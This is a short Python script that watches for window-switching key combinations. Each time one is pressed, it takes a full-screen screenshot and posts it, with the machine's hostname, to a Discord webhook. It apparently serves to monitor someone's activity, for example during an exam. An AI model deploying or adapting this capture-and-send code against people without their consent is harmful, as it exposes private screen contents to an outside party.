# Final Commit
# Coded by: Nathaniel Finuliar 
import pyautogui, socket, keyboard
from discord_webhook import DiscordWebhook, DiscordEmbed

class Detector():
    def __init__(self, path, url):
        self.path = path
        self.webhook_url = url

    def capture(self):
        image = pyautogui.screenshot()
        image.save(str(self.path))
    
    def webhook_Event(self):
        hostname = socket.gethostname()
        webhook = DiscordWebhook(url=self.webhook_url)
        with open("ss.png", "rb") as f:
            webhook.add_file(file=f.read(), filename='ss.png')
        embed = DiscordEmbed(title=f'Hostname: {hostname}\nScreen shot: ')
        embed.set_image(url="attachment://ss.png")
        webhook.add_embed(embed)
        webhook.execute()

    def is_detected(self):
        self.capture()
        self.webhook_Event()

    def detect(self):
        while True:
            if(keyboard.is_pressed('alt')):
                if(keyboard.is_pressed('tab')):
                    self.is_detected()
            elif(keyboard.is_pressed('ctrl')):
                if(keyboard.is_pressed('win')):
                    if(keyboard.is_pressed('left') or keyboard.is_pressed('right')):
                        self.is_detected()

if(__name__=="__main__"):
    print("started!")
    webhook_url = ""
    image_path = "./ss.png"
    detection = Detector(image_path, webhook_url)
    detection.detect()
